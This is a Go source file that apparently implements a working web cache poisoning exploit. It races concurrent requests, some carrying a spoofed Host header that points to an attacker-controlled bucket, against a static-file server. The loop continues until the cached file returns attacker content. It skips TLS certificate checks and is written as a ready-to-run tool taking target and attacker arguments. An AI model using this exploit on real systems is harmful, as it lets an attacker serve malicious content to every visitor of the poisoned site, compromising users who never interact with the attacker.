package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 6 {
		fmt.Fprintf(os.Stderr, "Usage: %s [task origin] [static URL] [attacker bucket] [path] [needle]", os.Args[0])
		os.Exit(1)
	}

	slog.SetDefault(slog.New(slog.NewJSONHandler(os.Stdout, nil)))

	if err := run(); err != nil {
		slog.Error("shutting down due to error", "error", err)
		os.Exit(1)
	}
}

func run() error {
	staticURL, err := url.Parse(os.Args[2])
	if err != nil {
		return fmt.Errorf("parsing static URL: %w", err)
	}

	taskOrigin := os.Args[1]
	staticHost := staticURL.Host
	attackerHost := os.Args[3]
	path := os.Args[4]

	// Request with the real host header
	realReq := fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %s\r\nOrigin: %s\r\n\r\n", path, staticHost, taskOrigin)
	if taskOrigin == "" {
		realReq = fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %s\r\n\r\n", path, staticHost)
	}
	fmt.Printf("Real request:\n%s", realReq)

	// Request with CC and Authorization to clean the cache prior to exploitation,
	// so that neither of the requests has to spend time on this
	cacheBustReq := fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %s\r\nCache-Control: no-cache\r\nAuthorization: test\r\n\r\n", path, staticHost)
	fmt.Printf("Cache bust request:\n%s", cacheBustReq)

	// Request with the spoofed host header
	spoofedReq := fmt.Sprintf("GET %s/%s HTTP/1.1\r\nHost: %s\r\nOrigin: %s\r\n\r\n", staticURL, path, attackerHost, taskOrigin)
	if taskOrigin == "" {
		spoofedReq = fmt.Sprintf("GET %s/%s HTTP/1.1\r\nHost: %s\r\n\r\n", staticURL, path, attackerHost)
	}
	fmt.Printf("Spoofed request:\n%s", spoofedReq)

	needle := os.Args[5]

	return attack(staticURL, taskOrigin, path, realReq, cacheBustReq, spoofedReq, needle)
}

func attack(staticURL *url.URL, taskOrigin, path, realReq, cacheBustReq, spoofedReq, needle string) error {
	// Number of goroutines for attack.
	const nReal = 4    // goroutines requesting the real file
	const nSpoofed = 4 // goroutines requesting the file with the spoofed attacker host
	const nTotal = nReal + nSpoofed

	errNotify := make(chan error, nTotal)

	go func() {
		err := <-errNotify
		slog.Error("fatal error, stopping now", "error", err)
		os.Exit(1)
	}()

	client := http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				ServerName:         staticURL.Host,
				InsecureSkipVerify: true,
			},
		},
	}

	port := staticURL.Port()
	if port == "" {
		if staticURL.Scheme == "http" {
			port = "80"
		} else {
			port = "443"
		}
	}

	addr := fmt.Sprintf("%s:%s", staticURL.Host, port)

	for {
		if err := cacheBust(addr, staticURL.Host, cacheBustReq); err != nil {
			return fmt.Errorf("performing cache bust: %w", err)
		}

		time.Sleep(time.Millisecond * 50)

		phase1Notify := make(chan struct{})

		var wg sync.WaitGroup
		wg.Add(nTotal)

		// run all workers and begin their first phase
		for i := 0; i < nReal; i++ {
			name := fmt.Sprintf("real %d", i)

			worker, err := newWorker(name, addr, staticURL.Host, &wg, phase1Notify, errNotify, realReq)
			if err != nil {
				return fmt.Errorf("initializing worker %s: %w", name, err)
			}

			go worker.run()
		}

		for i := 0; i < nSpoofed; i++ {
			name := fmt.Sprintf("spoofed %d", i)

			worker, err := newWorker(name, addr, staticURL.Host, &wg, phase1Notify, errNotify, spoofedReq)
			if err != nil {
				return fmt.Errorf("initializing worker %s: %w", name, err)
			}

			go worker.run()
		}

		// wait for all workers to complete first phase
		wg.Wait()

		// launch phase 2
		wg.Add(nTotal)
		close(phase1Notify)

		// wait for all workers to complete second phase
		wg.Wait()

		time.Sleep(time.Millisecond * 300)

		req, err := http.NewRequest(http.MethodGet, staticURL.JoinPath("/"+path).String(), nil)
		if err != nil {
			slog.Error("failed to construct request", "error", err)
			os.Exit(1)
		}

		req.Host = staticURL.Host
		if taskOrigin != "" {
			req.Header.Add("Origin", taskOrigin)
		}

		resp, err := client.Do(req)
		if err != nil {
			slog.Error("failed to do check", "error", err)
			os.Exit(1)
		}

		buf := make([]byte, 100)
		_, _ = resp.Body.Read(buf)

		slog.Info("result", "buf", string(buf))

		if bytes.Contains(buf, []byte(needle)) {
			slog.Info("success")
			return nil
		}

		resp.Body.Close()

		time.Sleep(time.Millisecond * 100)
		fmt.Printf("\n\n")
	}
}
